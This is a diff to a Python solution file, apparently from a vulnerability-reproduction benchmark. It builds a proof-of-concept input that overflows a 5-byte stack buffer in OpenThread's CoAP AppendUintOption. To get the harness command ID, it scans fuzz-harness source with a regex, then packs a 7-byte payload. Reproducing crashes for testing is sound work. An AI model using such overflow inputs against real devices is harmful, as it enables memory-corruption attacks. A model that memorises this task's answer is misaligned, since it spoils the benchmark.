@@ -1,44 +1,78 @@
+import os
+import re
 import struct
+import tarfile
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
         Generate a PoC that triggers the vulnerability.
         
-        The vulnerability is a stack buffer overflow in AppendUintOption within the coap-message library (or OpenThread).
-        The function uses a small stack buffer (typically 5 bytes) to encode the option.
-        Encoding a CoAP Option with Delta >= 13 and a 4-byte value requires:
-        - 1 byte for Option Header (Delta nibble 13, Length nibble 4)
-        - 1 byte for Extended Delta (Delta - 13)
-        - 4 bytes for the Value
-        Total: 6 bytes.
-        Writing 6 bytes into a 5-byte buffer triggers the overflow/sanitizer error.
+        The vulnerability is a stack buffer overflow in `AppendUintOption` in `coap-message.cpp`.
+        The function allocates a small fixed-size buffer (5 bytes) but can write up to 7 bytes 
+        (1 byte header + 2 bytes extended delta + 4 bytes value).
         
-        We construct a minimal valid CoAP message with Option 14 (Max-Age), which is a Uint option.
+        We need to identify the command ID mapping in the fuzzer harness and supply 
+        arguments that trigger the maximum encoding length.
         """
+        # Default command ID for AppendUintOption (commonly 6 in OpenThread fuzzers)
+        cmd_id = 6
         
-        # CoAP Header:
-        # Ver = 1 (2 bits) -> 01
-        # Type = CON (0) (2 bits) -> 00
-        # TKL = 0 (4 bits) -> 0000
-        # Byte 0: 01000000 -> 0x40
-        # Code = GET (1) -> 0x01
-        # Message ID = 0x0001
-        header = b'\x40\x01\x00\x01'
+        content = ""
         
-        # Option 14 (Max-Age)
-        # We need Delta = 14.
-        # CoAP Delta encoding for 13-268:
-        #   First nibble = 13 (0xD)
-        #   Followed by 1 byte (Extended Delta) = Actual Delta - 13
-        #   14 - 13 = 1 (0x01)
-        # Length = 4 (for uint32 max value) -> 0x4
-        #
-        # Option Header Byte: (0xD << 4) | 0x4 = 0xD4
-        # Extended Delta Byte: 0x01
-        # Value (4 bytes): 0xFFFFFFFF
+        # Attempt to extract harness source code to identify the correct command ID
+        try:
+            if os.path.isdir(src_path):
+                # Search for coap_message.cpp in fuzz directories
+                found_path = None
+                for root, dirs, files in os.walk(src_path):
+                    if "coap_message.cpp" in files and ("fuzz" in root or "tests" in root):
+                        current_path = os.path.join(root, "coap_message.cpp")
+                        # Prefer the one in 'fuzz' directory if multiple exist
+                        if "fuzz" in root:
+                            found_path = current_path
+                            break
+                        if found_path is None:
+                            found_path = current_path
+                
+                if found_path and os.path.exists(found_path):
+                    with open(found_path, "r", encoding="utf-8", errors="ignore") as f:
+                        content = f.read()
+            
+            elif os.path.isfile(src_path) and (src_path.endswith(".tar.gz") or src_path.endswith(".tgz")):
+                # Handle tarball input if provided as a file
+                with tarfile.open(src_path, "r:*") as tar:
+                    for member in tar.getmembers():
+                        if "coap_message.cpp" in member.name and ("fuzz" in member.name or "tests" in member.name):
+                            f = tar.extractfile(member)
+                            if f:
+                                content = f.read().decode("utf-8", errors="ignore")
+                            break
+        except Exception:
+            # If parsing fails, proceed with default ID
+            pass
+
+        # Parse the command ID from the source code using regex
+        if content:
+            # Look for pattern: case <ID>: ... AppendUintOption
+            # Use non-greedy match ensuring we don't skip over another 'case'
+            regex = r'case\s+(\d+)\s*:(?:(?!case\s+\d).)*?AppendUintOption'
+            match = re.search(regex, content, re.DOTALL | re.IGNORECASE)
+            if match:
+                try:
+                    cmd_id = int(match.group(1))
+                except ValueError:
+                    pass
+
+        # Construct the PoC payload
+        # 1. Command ID (1 byte)
+        # 2. Option Number (2 bytes, Little Endian): 0xFFFF 
+        #    - Ensures Delta is large (>= 269), forcing 2 bytes of extended delta.
+        #    - 1 byte header + 2 bytes ext delta = 3 bytes used.
+        # 3. Value (4 bytes, Little Endian): 0xFFFFFFFF
+        #    - Ensures full 4 bytes are written.
+        # Total written: 3 + 4 = 7 bytes. Buffer is 5 bytes -> Overflow.
         
-        # This creates a 6-byte sequence for the option.
-        option = b'\xD4\x01\xFF\xFF\xFF\xFF'
+        payload = struct.pack('<BHI', cmd_id, 0xFFFF, 0xFFFFFFFF)
         
-        return header + option
+        return payload
